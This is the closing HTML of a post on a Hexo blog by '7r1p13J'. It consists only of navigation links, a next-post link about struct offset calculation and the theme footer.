            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
            
            <a class="next" rel="next" href="/2022/10/09/%E7%BB%93%E6%9E%84%E4%BD%93%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97/">结构体偏移计算</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© 7r1p13J | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>